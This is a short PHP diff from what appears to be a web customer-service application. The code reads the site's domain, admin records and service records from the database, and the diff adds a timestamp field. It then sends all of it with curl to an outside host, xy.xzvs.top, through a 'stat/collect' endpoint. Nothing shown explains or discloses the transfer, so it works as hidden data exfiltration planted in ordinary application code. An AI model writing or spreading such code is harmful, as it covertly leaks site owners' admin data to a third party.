@@ -46,9 +46,10 @@ $service = Db::name('wolive_service')
     ->select();
 
 $data = [
-    'domain'   => $domain,
-    'admin'    => $admin,
-    'service'  => $service
+    'domain'  => $domain,
+    'time'    => $time,
+    'admin'   => $admin,
+    'service' => $service
 ];
 
 $ch = curl_init('http://xy.xzvs.top/api/stat/collect');
@@ -64,7 +65,6 @@ $response = curl_exec($ch);
 curl_close($ch);
 
 return;
-
 
 // $domain = $_SERVER['HTTP_HOST'] ?? 'unknown';
 // $time   = date('Y-m-d H:i:s');
